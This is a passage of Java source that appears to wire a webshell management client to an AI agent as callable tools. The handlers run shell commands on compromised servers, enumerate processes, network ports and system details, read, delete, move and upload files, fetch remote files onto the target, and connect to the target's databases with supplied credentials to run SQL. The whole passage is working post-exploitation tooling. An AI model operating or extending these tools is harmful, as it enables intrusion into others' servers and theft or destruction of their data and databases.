        sb.append("\u7cfb\u7edf\u4fe1\u606f: ").append(basicInfoValue(info, "OsInfo")).append("\n");
        sb.append("\u73af\u5883\u53d8\u91cf USERDOMAIN: ").append(basicInfoValue(info, "USERDOMAIN")).append("\n");
        sb.append("\u73af\u5883\u53d8\u91cf LOGONSERVER: ").append(basicInfoValue(info, "LOGONSERVER")).append("\n");
        sb.append("\u73af\u5883\u53d8\u91cf windir: ").append(basicInfoValue(info, "windir")).append("\n");
        sb.append("JAVA_HOME(java.home): ").append(basicInfoValue(info, "java.home")).append("\n");
        sb.append("JDK \u7248\u672c(java.version): ").append(basicInfoValue(info, "java.version")).append("\n");
        if (info == null || info.isEmpty()) return sb.toString() + " | (basicsInfo empty)";
        return sb.toString();
    }

    /** \u4ece basicsInfo (\u7cfb\u7edf\u5c5e\u6027\u5168\u91cf) \u63d0\u53d6\u67d0\u4e2a key \u7684\u503c */
    private static String basicInfoValue(String info, String key) {
        if (info == null) return "";
        String prefix = key + " : ";
        int i = info.indexOf(prefix);
        if (i < 0) { prefix = key + ":"; i = info.indexOf(prefix); }
        if (i < 0) return "";
        int start = i + prefix.length();
        int end = info.indexOf("\n", start);
        String v = (end < 0 ? info.substring(start) : info.substring(start, end)).trim();
        return v;
    }

    /** IPList \u91cc\u53d6\u7b2c\u4e00\u4e2a IPv4 (ipv6 \u548c %scope \u6392\u9664) */
    private static String firstIpv4(String iplist) {
        if (iplist == null || iplist.isEmpty()) return "";
        for (String p : iplist.split(",")) {
            String t = p.trim();
            if (t.matches("\\d{1,3}(\\.\\d{1,3}){3}")) return t;
        }
        return "";
    }

    /** OsInfo (\u4f8b: os.name: Windows 11 os.version: 10.0 os.arch: amd64) \u7b80\u5316\u4e3a\u53ef\u8bfb\u540d */
    private static String osName(String osInfo) {
        if (osInfo == null || osInfo.isEmpty()) return "";
        String name = "";
        String ver = "";
        int ni = osInfo.indexOf("os.name:");
        if (ni >= 0) {
            String tail = osInfo.substring(ni + 8).trim();
            int next = tail.indexOf("os.");
            name = (next < 0 ? tail : tail.substring(0, next)).trim();
        }
        int vi = osInfo.indexOf("os.version:");
        if (vi >= 0) {
            String tail = osInfo.substring(vi + 11).trim();
            int next = tail.indexOf("os.");
            ver = (next < 0 ? tail : tail.substring(0, next)).trim();
        }
        return ver.isEmpty() ? name : name + " (" + ver + ")";
    }

    private String shellTest(Map<String, Object> a) {
        // \u7edf\u4e00\u8d70 getShellInit\uff0c\u4fdd\u8bc1 encoding \u88ab\u5e26\u5165/\u81ea\u52a8\u8865\u9f50
        try {
            ShellEntity sh = getShellInit(a);
            String info = sh.getPayloadModule().getBasicsInfo();
            String first = (info != null && !info.isEmpty()) ? info.split("\n")[0] : "";
            return "\u8fde\u63a5\u6d4b\u8bd5\u6210\u529f | encoding=" + safeEncoding(sh.getEncoding()) + " | " + first;
        } catch (Exception e) {
            java.io.StringWriter sw = new java.io.StringWriter();
            e.printStackTrace(new java.io.PrintWriter(sw));
            String trace = sw.toString();
            String[] lines = trace.split("\n");
            if (lines.length > 40) {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 40; i++) sb.append(lines[i]).append("\n");
                trace = sb.toString() + "... (truncated)";
            }
            return "\u8fde\u63a5\u6d4b\u8bd5\u5931\u8d25: " + (e.getMessage() != null ? e.getMessage() : e.getClass().getSimpleName()) + "\n" + trace;
        }
    }

    private String processList(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a); Payload pl = sh.getPayloadModule();
        String cmd = pl.getOsInfo().toLowerCase().contains("win") ? "tasklist" : "ps aux";
        String r = pl.execCommand(cmd); 
        return r;
    }

    private String fileSearch(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a); Payload pl = sh.getPayloadModule();
        String pattern = (String) a.get("pattern");
        if (pattern == null || pattern.isEmpty()) return "\u8bf7\u63d0\u4f9b pattern \u53c2\u6570";
        String path = (String) a.getOrDefault("path", pl.currentDir());
        String normPat = pattern.replace("*", "").toLowerCase();
        StringBuilder sb = new StringBuilder();
        int found = 0;
        // Recursive search via getFile()
        java.util.LinkedList<String> dirs = new java.util.LinkedList<>();
        dirs.add(path);
        int scanned = 0;
        while (!dirs.isEmpty() && scanned < 2000) {
            String dir = dirs.poll();
            try {
                core.shell.GFile[] files = pl.getFile(dir);
                if (files == null) continue;
                for (core.shell.GFile f : files) {
                    scanned++;
                    if (f.isDirectory()) { dirs.add(f.getAbsolutePath()); continue; }
                    if (f.getName().toLowerCase().contains(normPat)) {
                        sb.append(f.getAbsolutePath()).append(" (").append(f.length()).append(" bytes)\n");
                        found++;
                    }
                }
            } catch (Exception ignored) {}
        }
        return found > 0 ? "\u627e\u5230 " + found + " \u4e2a\u6587\u4ef6:\n" + sb.toString() : "\u672a\u627e\u5230\u5339\u914d " + pattern + " \u7684\u6587\u4ef6";
    }

    private String netInfo(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a); Payload pl = sh.getPayloadModule();
        boolean isWin = pl.getOsInfo().toLowerCase().contains("win");
        String cmd = isWin ? "netstat -ano" : "netstat -tlnp 2>/dev/null || ss -tlnp";
        String r = pl.execCommand(cmd); 
        return r;
    }

    // --- Command ---
    private String shellExec(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a);
        Payload pl = sh.getPayloadModule();
        String command = (String) a.get("command");
        String osHint = (String) a.get("os"); // optional override: "win" or "linux"
        if (osHint == null) osHint = pl.getOsInfo();
        boolean isWin = osHint != null && osHint.toLowerCase().contains("win");
        // Wrap multi-line commands
        if (isWin && !command.toLowerCase().startsWith("cmd") && command.contains("\n")) {
            command = "cmd /c " + command.replace("\n", " & ");
        }
        String result = pl.execCommand(command);
        if (result == null || result.isEmpty()) return "(\u65e0\u8f93\u51fa)";
        return result;
    }

    // --- File Operations ---
    private String fileList(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a);
        Payload pl = sh.getPayloadModule();
        String path = (String) a.get("path");
        if (path == null || path.isEmpty()) path = pl.currentDir();
        try {
            core.shell.GFile[] files = pl.getFile(path);
            if (files == null || files.length == 0) return "\u76ee\u5f55\u4e3a\u7a7a: " + path;
            StringBuilder sb = new StringBuilder("\u76ee\u5f55: " + path + "\n");
            for (core.shell.GFile f : files) {
                sb.append(f.isDirectory() ? "D " : "F ");
                sb.append(String.format("%-12s", f.isDirectory() ? "" : String.valueOf(f.length())));
                sb.append("  ").append(f.lastModifiedStr());
                sb.append("  ").append(f.getName()).append("\n");
            }
            return sb.toString();
        } catch (Exception e) {
            return "\u5217\u76ee\u5f55\u5931\u8d25: " + e.getMessage();
        }
    }

    private String fileRead(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a);
        Payload pl = sh.getPayloadModule();
        String path = (String) a.get("path");
        // Check file size first to avoid loading huge files into AI context
        long size = pl.getFileSize(path);
        if (size > 512 * 1024) {
            return "\u6587\u4ef6\u8fc7\u5927(" + size + " bytes)\uff0c\u8bf7\u7528 file_download_local \u4e0b\u8f7d\u5230\u672c\u5730\u518d\u67e5\u770b";
        }
        byte[] data = pl.downloadFile(path);
        if (data == null || data.length == 0) return "\u6587\u4ef6\u4e3a\u7a7a\u6216\u4e0d\u5b58\u5728";
        // \u4f18\u5148\u7528\u53c2\u6570 encoding\uff0c\u5176\u6b21 Shell \u914d\u7f6e\u7f16\u7801\uff08\u907f\u514d\u5199\u6b7b UTF-8 \u5bfc\u81f4\u4e2d\u6587\u4e71\u7801\uff09
        String enc = a.containsKey("encoding") ? String.valueOf(a.get("encoding")) : safeEncoding(sh.getEncoding());
        if (enc == null || enc.isEmpty() || "null".equalsIgnoreCase(enc)) enc = safeEncoding(sh.getEncoding());
        try { return new String(data, enc); }
        catch (Exception e) {
            try { return new String(data, StandardCharsets.UTF_8); }
            catch (Exception e2) { return "[Binary] \u8bf7\u7528 file_download_local \u4e0b\u8f7d"; }
        }
    }

    private String fileDelete(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a);
        Payload pl = sh.getPayloadModule();
        boolean ok = pl.deleteFile((String) a.get("path"));
        
        return ok ? "\u5220\u9664\u6210\u529f" : "\u5220\u9664\u5931\u8d25";
    }

    private String fileCopy(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a);
        Payload pl = sh.getPayloadModule();
        boolean ok = pl.copyFile((String) a.get("src"), (String) a.get("dest"));
        
        return ok ? "\u590d\u5236\u6210\u529f" : "\u590d\u5236\u5931\u8d25";
    }

    private String fileMove(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a);
        Payload pl = sh.getPayloadModule();
        boolean ok = pl.moveFile((String) a.get("src"), (String) a.get("dest"));
        
        return ok ? "\u79fb\u52a8\u6210\u529f" : "\u79fb\u52a8\u5931\u8d25";
    }

    private String fileMkdir(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a);
        Payload pl = sh.getPayloadModule();
        boolean ok = pl.newDir((String) a.get("path"));
        
        return ok ? "\u521b\u5efa\u6210\u529f" : "\u521b\u5efa\u5931\u8d25";
    }

    private String fileAttr(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a);
        Payload pl = sh.getPayloadModule();
        boolean ok = pl.setFileAttr((String) a.get("path"), (String) a.get("type"), (String) a.get("attr"));
        
        return ok ? "\u8bbe\u7f6e\u6210\u529f" : "\u8bbe\u7f6e\u5931\u8d25";
    }

    private String fileRemoteDown(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a);
        Payload pl = sh.getPayloadModule();
        boolean ok = pl.fileRemoteDown((String) a.get("url"), (String) a.get("savePath"));
        
        return ok ? "\u4e0b\u8f7d\u6210\u529f" : "\u4e0b\u8f7d\u5931\u8d25";
    }

    private String fileRoots(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a);
        Payload pl = sh.getPayloadModule();
        String[] roots = pl.listFileRoot();
        
        StringBuilder sb = new StringBuilder();
        for (String r : roots) sb.append(r).append("\n");
        return sb.toString();
    }

    // --- Upload local file directly (server reads, auto-chunks) ---
    private String fileUploadLocal(Map<String, Object> a) {
        String localPath = (String) a.get("localPath");
        String remotePath = (String) a.get("remotePath");
        if (localPath == null || remotePath == null) return "\u7f3a\u5c11 localPath \u6216 remotePath";
        java.io.File f = new java.io.File(localPath);
        if (!f.exists()) return "\u672c\u5730\u6587\u4ef6\u4e0d\u5b58\u5728: " + localPath;
        try {
            ShellEntity sh = getShellInit(a);
            Payload pl = sh.getPayloadModule();
            byte[] data = java.nio.file.Files.readAllBytes(f.toPath());
            long size = f.length();
            if (size > 1048576) {
                int chunkSize = sh.getOnceBigFileUploadByteNum();
                if (chunkSize <= 0) chunkSize = 1048576;
                long pos = 0;
                while (pos < size) {
                    int len = (int) Math.min(chunkSize, size - pos);
                    byte[] chunk = new byte[len];
                    System.arraycopy(data, (int) pos, chunk, 0, len);
                    pl.bigFileUpload(remotePath, pos, chunk);
                    pos += len;
                }
                return "\u4e0a\u4f20\u6210\u529f! " + size + " bytes -> " + remotePath;
            } else {
                boolean ok = pl.uploadFile(remotePath, data);
                return ok ? "\u4e0a\u4f20\u6210\u529f! " + size + " bytes -> " + remotePath : "\u4e0a\u4f20\u5931\u8d25";
            }
        } catch (Exception ex) { return "\u4e0a\u4f20\u5931\u8d25: " + ex.getMessage(); }
    }

    // --- Download remote file directly to local (server writes) ---
    private String fileDownloadLocal(Map<String, Object> a) {
        String remotePath = (String) a.get("remotePath");
        String localPath = (String) a.get("localPath");
        if (remotePath == null || localPath == null) return "\u7f3a\u5c11 remotePath \u6216 localPath";
        try {
            ShellEntity sh = getShellInit(a);
            Payload pl = sh.getPayloadModule();
            // Try small file first
            byte[] data = pl.downloadFile(remotePath);
            if (data == null || data.length == 0) return "\u4e0b\u8f7d\u5931\u8d25: \u8fdc\u7a0b\u6587\u4ef6\u4e3a\u7a7a\u6216\u4e0d\u5b58\u5728";
            java.nio.file.Files.write(java.nio.file.Paths.get(localPath), data);
            return "\u4e0b\u8f7d\u6210\u529f! " + data.length + " bytes -> " + localPath;
        } catch (Exception ex) { return "\u4e0b\u8f7d\u5931\u8d25: " + ex.getMessage(); }
    }


    // --- Database: Shell \u5df2\u4fdd\u5b58\u8fde\u63a5 + \u539f\u7248 ShellDatabasePanel.execSql ---
    private String dbConnect(Map<String, Object> a) {
        try {
            ShellEntity sh = getShellInit(a);
            mergeDbConnectArgs(a);
            DbInfo dbInfo = resolveDbInfo(sh, a);
            if (dbInfo == null) {
                return "\u7f3a\u5c11\u8fde\u63a5\u53c2\u6570\u3002\u4f8b: target=127.0.0.1 1433 sa 123456 sqlserver\n" + dbNeedConfigHint(sh);
            }
            if (isBlank(dbInfo.getHost()) || isBlank(dbInfo.getDatabaseType())) {
                return "\u7f3a\u5c11 host \u6216\u5e93\u7c7b\u578b\u3002\u4f8b: 127.0.0.1 1433 sa 123456 sqlserver";
            }
            ensureDbDefaults(dbInfo);
            ensureDbDrive(sh, dbInfo);
            persistDbInfo(sh, dbInfo);
            rememberDbConfig(sh, dbInfo);
            String type = dbInfo.getDatabaseType();
            String tpl = DatabaseSql.sqlMap.get(type.toLowerCase() + "-getAllDatabase");
            if (tpl == null) {
                return "\u5df2\u5199\u5165\u8fde\u63a5 " + nvl(dbInfo.getConfigName()) + " \u4f46\u65e0\u5217\u5e93\u6a21\u677f: " + type;
            }
            Object result = execViaDatabasePanel(sh, dbInfo, "select", tpl);
            return "\u5df2\u7ecf WebShell \u8fde\u5e93: " + nvl(dbInfo.getConfigName())
                    + "\t" + type + "\t" + nvl(dbInfo.getHost()) + ":" + dbInfo.getPort()
                    + "\tuser=" + nvl(dbInfo.getUsername())
                    + "\tdb=" + nvl(dbInfo.getCurrentDatabase())
                    + "\n" + formatDbResult(result);
        } catch (Exception ex) {
            return "\u8fde\u63a5\u5931\u8d25: " + (ex.getMessage() != null ? ex.getMessage() : ex.toString());
        }
    }

    private String dbExec(Map<String, Object> a) {
        String sql = strArg(a.get("sql"));
        if (isBlank(sql)) return "\u7f3a\u5c11 sql";
        try {
            ShellEntity sh = getShellInit(a);
            DbInfo dbInfo = resolveDbInfo(sh, a);
            if (dbInfo == null) return dbNeedConfigHint(sh);
            rememberDbConfig(sh, dbInfo);
            String execType = inferExecType(sql, strArg(a.get("execType")));
            return formatDbResult(execViaDatabasePanel(sh, dbInfo, execType, sql));
        } catch (Exception ex) {
            return "SQL \u5931\u8d25: " + (ex.getMessage() != null ? ex.getMessage() : ex.toString());
        }
    }

    private String dbDatabases(Map<String, Object> a) {
        return dbRunTemplate(a, "getAllDatabase", null, null);
    }

    private String dbTables(Map<String, Object> a) {
        String database = firstNonBlank(strArg(a.get("database")), strArg(a.get("dbName")));
        if (isBlank(database)) return "\u7f3a\u5c11 database(\u5e93\u540d)";
        if (isBlank(a.get("dbName"))) a.put("dbName", database);
        return dbRunTemplate(a, "getTableByDatabase", database, null);
    }

    private String dbPreview(Map<String, Object> a) {
        String table = strArg(a.get("table"));
        if (isBlank(table)) return "\u7f3a\u5c11 table";
        String database = firstNonBlank(strArg(a.get("database")), strArg(a.get("dbName")));
        if (!isBlank(database) && isBlank(a.get("dbName"))) a.put("dbName", database);
        return dbRunTemplate(a, "getTableDataByDT", database, table);
    }

    private String dbCount(Map<String, Object> a) {
        String table = strArg(a.get("table"));
        if (isBlank(table)) return "\u7f3a\u5c11 table";
        String database = firstNonBlank(strArg(a.get("database")), strArg(a.get("dbName")));
        if (!isBlank(database) && isBlank(a.get("dbName"))) a.put("dbName", database);
        return dbRunTemplate(a, "getCountByDT", database, table);
    }

    private String dbRunTemplate(Map<String, Object> a, String suffix, String database, String table) {
        try {
            ShellEntity sh = getShellInit(a);
            DbInfo dbInfo = resolveDbInfo(sh, a);
            if (dbInfo == null) return dbNeedConfigHint(sh);
            if (!isBlank(database)) {
                dbInfo.setCurrentDatabase(database);
            }
            String type = dbInfo.getDatabaseType();
            if (isBlank(type)) return "\u7f3a\u5c11 dbType";
            String tpl = DatabaseSql.sqlMap.get(type.toLowerCase() + "-" + suffix);
            if (tpl == null) return "\u4e0d\u652f\u6301\u7684\u6a21\u677f: " + type + "-" + suffix;
            String dbName = firstNonBlank(database, dbInfo.getCurrentDatabase(), "");
            String sql = tpl.replace("{databaseName}", dbName).replace("{tableName}", table == null ? "" : table);
            rememberDbConfig(sh, dbInfo);
            return formatDbResult(execViaDatabasePanel(sh, dbInfo, "select", sql));
        } catch (Exception ex) {
            return "\u67e5\u8be2\u5931\u8d25: " + (ex.getMessage() != null ? ex.getMessage() : ex.toString());
        }
    }

    private String dbListTypes(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a);
        String[] types = sh.getPayloadModule().getSupportDatabaseTypes();
        return types == null || types.length == 0 ? "\u65e0\u652f\u6301\u7684\u6570\u636e\u5e93\u7c7b\u578b" : String.join(", ", types);
    }

    @SuppressWarnings("unchecked")
    private String dbConfigs(Map<String, Object> a) {
        ShellEntity sh = getShell(a);
        String action = String.valueOf(a.getOrDefault("action", "list"));
        switch (action) {
            case "list": {
                String[] configs = sh.listDatabaseConfigs();
                if (configs == null || configs.length == 0) return "\u65e0\u6570\u636e\u5e93\u914d\u7f6e";
                StringBuilder sb = new StringBuilder();
                for (String name : configs) {
                    DbInfo info = sh.getDbInfo(name);
                    sb.append(name);
                    if (info != null) {
                        sb.append("\t").append(nvl(info.getDatabaseType()))
                                .append("\t").append(nvl(info.getHost())).append(":").append(info.getPort())
                                .append("\t").append(nvl(info.getCurrentDatabase()))
                                .append("\t").append(nvl(info.getUsername()));
                    }
                    sb.append("\n");
                }
                return sb.toString();
            }
            case "get": {
                DbInfo info = sh.getDbInfo(strArg(a.get("configName")));
                return info != null ? formatDbInfo(info) : "\u672a\u627e\u5230";
            }
            case "add":
            case "update": {
                DbInfo info = dbInfoFromArgs(a);
                if (info == null) return "\u7f3a\u5c11\u914d\u7f6e: \u4f20 dbInfo YAML \u6216 configName+dbType+dbHost \u7b49\u5e73\u94fa\u5b57\u6bb5";
                if (isBlank(info.getConfigName())) return "\u7f3a\u5c11 configName";
                boolean ok = "add".equals(action) ? sh.addDbIfo(info) : sh.updateDbIfo(info);
                return ok ? "\u6210\u529f: " + info.getConfigName() : ("add".equals(action) ? "\u5931\u8d25(\u53ef\u80fd\u5df2\u5b58\u5728)" : "\u5931\u8d25");
            }
            case "delete":
                return sh.deleteDbInfo(strArg(a.get("configName"))) ? "\u5220\u9664\u6210\u529f" : "\u5220\u9664\u5931\u8d25";
            default:
                return "\u672a\u77e5\u64cd\u4f5c: " + action + " (\u652f\u6301 list/add/get/update/delete)";
        }
    }

    /** Prefer GUI-saved DatabaseConfig_*; same store as the Database tab. */
    private DbInfo resolveSavedDbInfo(ShellEntity sh, String configName) {
        if (!isBlank(configName)) {
            DbInfo named = sh.getDbInfo(configName);
            if (named == null) {
                throw new RuntimeException("\u672a\u627e\u5230\u6570\u636e\u5e93\u8fde\u63a5: " + configName + "\uff0c\u7528 db_configs action=list \u67e5");
            }
            return named;
        }
        String last = dbActiveConfig.get(sh.getId());
        if (!isBlank(last)) {
            DbInfo remembered = sh.getDbInfo(last);
            if (remembered != null) {
                return remembered;
            }
        }
        String[] configs = sh.listDatabaseConfigs();
        if (configs != null && configs.length > 0) {
            return sh.getDbInfo(configs[0]);
        }
        return null;
    }

    private DbInfo resolveDbInfo(ShellEntity sh, Map<String, Object> a) {
        mergeDbConnectArgs(a);
        boolean hasInline = !isBlank(a.get("dbHost")) || !isBlank(a.get("dbType"))
                || !isBlank(a.get("dbUser")) || !isBlank(a.get("target"));
        DbInfo dbInfo = null;
        if (!isBlank(a.get("configName")) || !hasInline) {
            try {
                dbInfo = resolveSavedDbInfo(sh, strArg(a.get("configName")));
            } catch (RuntimeException ex) {
                if (!hasInline) {
                    throw ex;
                }
            }
        }
        if (dbInfo == null) {
            if (!hasInline) {
                return null;
            }
            dbInfo = new DbInfo();
        }
        applyDbArgs(dbInfo, a);
        ensureDbDefaults(dbInfo);
        return dbInfo;
    }

    /** Accept "127.0.0.1 1433 sa 123456 sqlserver" plus host/port/user/pass aliases. */
    private void mergeDbConnectArgs(Map<String, Object> a) {
        aliasIfAbsent(a, "host", "dbHost");
        aliasIfAbsent(a, "ip", "dbHost");
        aliasIfAbsent(a, "port", "dbPort");
        aliasIfAbsent(a, "user", "dbUser");
        aliasIfAbsent(a, "username", "dbUser");
        aliasIfAbsent(a, "password", "dbPass");
        aliasIfAbsent(a, "pass", "dbPass");
        aliasIfAbsent(a, "type", "dbType");
        aliasIfAbsent(a, "database", "dbName");
        String target = firstNonBlank(strArg(a.get("target")), strArg(a.get("connect")));
        if (isBlank(target)) {
            return;
        }
        Map<String, Object> parsed = parseDbTarget(target);
        for (Map.Entry<String, Object> e : parsed.entrySet()) {
            if (isBlank(a.get(e.getKey()))) {
                a.put(e.getKey(), e.getValue());
            }
        }
    }

    private static void aliasIfAbsent(Map<String, Object> a, String from, String to) {
        if (isBlank(a.get(to)) && !isBlank(a.get(from))) {
            a.put(to, a.get(from));
        }
    }

    private Map<String, Object> parseDbTarget(String target) {
        Map<String, Object> m = new java.util.LinkedHashMap<>();
        if (isBlank(target)) {
            return m;
        }
        java.util.ArrayList<String> tokens = new java.util.ArrayList<>();
        for (String raw : target.trim().replace(',', ' ').split("\\s+")) {
            if (raw.isEmpty()) {
                continue;
            }
            int colon = raw.lastIndexOf(':');
            if (colon > 0 && colon < raw.length() - 1 && raw.substring(colon + 1).matches("\\d{1,5}")) {
                tokens.add(raw.substring(0, colon));
                tokens.add(raw.substring(colon + 1));
            } else {
                tokens.add(raw);
            }
        }
        java.util.ArrayList<String> leftover = new java.util.ArrayList<>();
        for (String tok : tokens) {
            String type = normalizeDbType(tok);
            if (type != null && isBlank(m.get("dbType"))) {
                m.put("dbType", type);
            } else if (tok.matches("\\d{1,5}") && isBlank(m.get("dbPort"))) {
                int p = toInt(tok, 0);
                if (p > 0 && p <= 65535) {
                    m.put("dbPort", tok);
                } else {
                    leftover.add(tok);
                }
            } else if (isDbHostToken(tok) && isBlank(m.get("dbHost"))) {
                m.put("dbHost", tok);
            } else {
                leftover.add(tok);
            }
        }
        if (isBlank(m.get("dbHost")) && !leftover.isEmpty()) {
            m.put("dbHost", leftover.remove(0));
        }
        if (!leftover.isEmpty() && isBlank(m.get("dbUser"))) {
            m.put("dbUser", leftover.remove(0));
        }
        if (!leftover.isEmpty() && isBlank(m.get("dbPass"))) {
            m.put("dbPass", leftover.remove(0));
        }
        if (!leftover.isEmpty() && isBlank(m.get("dbName"))) {
            m.put("dbName", leftover.remove(0));
        }
        return m;
    }

    private static String normalizeDbType(String tok) {
        if (tok == null) {
            return null;
        }
        String t = tok.toLowerCase();
        if ("mssql".equals(t) || "mssqlserver".equals(t) || "sqlserver".equals(t)) {
            return "sqlserver";
        }
        if ("postgres".equals(t) || "pgsql".equals(t) || "postgresql".equals(t)) {
            return "postgresql";
        }
        if ("mysql".equals(t) || "oracle".equals(t) || "sqlite".equals(t)) {
            return t;
        }
        return null;
    }

    private static boolean isDbHostToken(String tok) {
        if (tok == null || tok.isEmpty()) {
            return false;
        }
        String t = tok.toLowerCase();
        if ("localhost".equals(t) || "127.0.0.1".equals(t) || "::1".equals(t)) {
            return true;
        }
        if (t.matches("\\d{1,3}(\\.\\d{1,3}){3}")) {
            return true;
        }
        return t.indexOf('.') > 0 && t.matches("[A-Za-z0-9._\\-]+");
    }

    private void ensureDbDefaults(DbInfo dbInfo) {
        if (dbInfo == null) {
            return;
        }
        if (isBlank(dbInfo.getDatabaseType()) && dbInfo.getPort() > 0) {
            switch (dbInfo.getPort()) {
                case 1433: dbInfo.setDatabaseType("sqlserver"); break;
                case 3306: dbInfo.setDatabaseType("mysql"); break;
                case 1521: dbInfo.setDatabaseType("oracle"); break;
                case 5432: dbInfo.setDatabaseType("postgresql"); break;
                default: break;
            }
        }
        if (dbInfo.getPort() <= 0) {
            dbInfo.setPort(defaultDbPort(dbInfo.getDatabaseType()));
        }
        if (isBlank(dbInfo.getCurrentDatabase())) {
            String type = nvl(dbInfo.getDatabaseType()).toLowerCase();
            if ("sqlserver".equals(type)) {
                dbInfo.setCurrentDatabase("master");
            } else if ("mysql".equals(type)) {
                dbInfo.setCurrentDatabase("mysql");
            } else if ("postgresql".equals(type)) {
                dbInfo.setCurrentDatabase("postgres");
            }
        }
        if (isBlank(dbInfo.getConfigName())) {
            String auto = nvl(dbInfo.getDatabaseType()) + "-" + nvl(dbInfo.getHost()) + "-" + dbInfo.getPort();
            dbInfo.setConfigName(auto.replaceAll("[^A-Za-z0-9._-]", "_"));
        }
        String cs = null;
        try {
            cs = dbInfo.getDatabaseCharset();
        } catch (Throwable ignored) {
        }
        if (isBlank(cs)) {
            dbInfo.setDatabaseCharset("UTF-8");
        }
    }

    private void persistDbInfo(ShellEntity sh, DbInfo dbInfo) {
        if (sh == null || dbInfo == null || isBlank(dbInfo.getConfigName())) {
            return;
        }
        if (!sh.addDbIfo(dbInfo)) {
            sh.updateDbIfo(dbInfo);
        }
    }

    private void rememberDbConfig(ShellEntity sh, DbInfo dbInfo) {
        if (sh != null && dbInfo != null && !isBlank(dbInfo.getConfigName())) {
            dbActiveConfig.put(sh.getId(), dbInfo.getConfigName());
        }
    }

    /**
     * Same path as the Database tab: live ShellDatabasePanel.execSql when the
     * shell window is open; otherwise Payload.execSql with the saved DbInfo.
     */
    private void ensureDbDrive(ShellEntity sh, DbInfo dbInfo) {
        if (dbInfo == null || !isBlank(dbInfo.getDatabaseDrive())) {
            return;
        }
        String type = dbInfo.getDatabaseType();
        if (isBlank(type) || sh == null || sh.getPayloadModule() == null) {
            return;
        }
        try {
            String[] drives = sh.getPayloadModule().getDatabaseDrives(type);
            if (drives != null && drives.length > 0 && !isBlank(drives[0])) {
                dbInfo.setDatabaseDrive(drives[0]);
            }
        } catch (Throwable ignored) {
        }
    }

    private Object execViaDatabasePanel(ShellEntity sh, DbInfo dbInfo, String execType, String sql) throws Exception {
        if (dbInfo == null) {
            throw new IllegalArgumentException("\u672a\u627e\u5230\u6570\u636e\u5e93\u8fde\u63a5");
        }
        ensureDbDrive(sh, dbInfo);
        ShellDatabasePanel panel = findLiveDatabasePanel(sh);
        if (panel != null) {
            bindPanelDbInfo(panel, dbInfo);
            GDatabaseResult r = panel.execSql(execType, sql);
            if (r != null) {
                return r;
            }
        }
        DbInfo clone = (DbInfo) dbInfo.clone();
        return sh.getPayloadModule().execSql(clone, execType, sql);
    }

    private ShellDatabasePanel findLiveDatabasePanel(ShellEntity sh) {
        try {
            if (sh.getFrame() != null) {
                Object c = sh.getFrame().getBasicComponent("DatabaseManage");
                if (c instanceof ShellDatabasePanel) {
                    return (ShellDatabasePanel) c;
                }
            }
        } catch (Throwable ignored) {
        }
        return null;
    }

    private void bindPanelDbInfo(ShellDatabasePanel panel, DbInfo dbInfo) {
        try {
            java.lang.reflect.Field f = ShellDatabasePanel.class.getDeclaredField("dbInfo");
            f.setAccessible(true);
            f.set(panel, dbInfo);
        } catch (Exception ignored) {
        }
        if (panel.currentDbTextField != null) {
            String cur = dbInfo.getCurrentDatabase();
            panel.currentDbTextField.setText(cur == null ? "" : cur);
        }
    }

    private void applyDbArgs(DbInfo dbInfo, Map<String, Object> a) {
        if (!isBlank(a.get("dbType"))) dbInfo.setDatabaseType(strArg(a.get("dbType")));
        if (!isBlank(a.get("dbHost"))) dbInfo.setHost(strArg(a.get("dbHost")));
        if (!isBlank(a.get("dbPort"))) dbInfo.setPort(toInt(a.get("dbPort"), defaultDbPort(dbInfo.getDatabaseType())));
        if (!isBlank(a.get("dbName"))) dbInfo.setCurrentDatabase(strArg(a.get("dbName")));
        if (!isBlank(a.get("dbUser"))) dbInfo.setUsername(strArg(a.get("dbUser")));
        if (!isBlank(a.get("dbPass"))) dbInfo.setPassword(strArg(a.get("dbPass")));
        if (!isBlank(a.get("dbCharset"))) dbInfo.setDatabaseCharset(strArg(a.get("dbCharset")));
        if (!isBlank(a.get("dbDriver"))) dbInfo.setDatabaseDrive(strArg(a.get("dbDriver")));
        if (!isBlank(a.get("connectionString"))) dbInfo.setConnectionString(strArg(a.get("connectionString")));
        if (dbInfo.getPort() <= 0 && !isBlank(dbInfo.getDatabaseType())) {
            dbInfo.setPort(defaultDbPort(dbInfo.getDatabaseType()));
        }
    }

    @SuppressWarnings("unchecked")
    private DbInfo dbInfoFromArgs(Map<String, Object> a) {
        Object dbInfoObj = a.get("dbInfo");
        DbInfo info = null;
        if (dbInfoObj instanceof Map) {
            info = new Yaml().loadAs(new Yaml().dump(dbInfoObj), DbInfo.class);
        } else if (dbInfoObj instanceof String && !isBlank(dbInfoObj)) {
            info = new Yaml().loadAs((String) dbInfoObj, DbInfo.class);
        }
        if (info == null) {
            info = new DbInfo();
        }
        applyDbArgs(info, a);
        if (!isBlank(a.get("configName"))) {
            info.setConfigName(strArg(a.get("configName")));
        }
        if (isBlank(info.getConfigName()) && isBlank(info.getDatabaseType()) && isBlank(info.getHost())) {
            return null;
        }
        if (isBlank(info.getConfigName())) {
            String auto = nvl(info.getDatabaseType()) + "-" + nvl(info.getHost()) + "-" + nvl(info.getCurrentDatabase());
            info.setConfigName(auto.replaceAll("[^A-Za-z0-9._-]", "_"));
        }
        return info;
    }

    private String formatDbResult(Object result) {
        if (result == null) return "null";
        if (result instanceof GDatabaseResult) {
            GDatabaseResult r = (GDatabaseResult) result;
            Vector<String> cols = r.getColumnVector();
            Vector<Vector<String>> rows = r.getRowsVector();
            StringBuilder sb = new StringBuilder();
            if (cols != null && !cols.isEmpty()) {
                sb.append(joinTab(cols)).append("\n");
            }
            int n = 0;
            if (rows != null) {
                for (Vector<String> row : rows) {
                    sb.append(joinTab(row)).append("\n");
                    n++;
                }
            }
            sb.append("(").append(n).append(" rows)");
            return sb.toString();
        }
        return String.valueOf(result);
    }

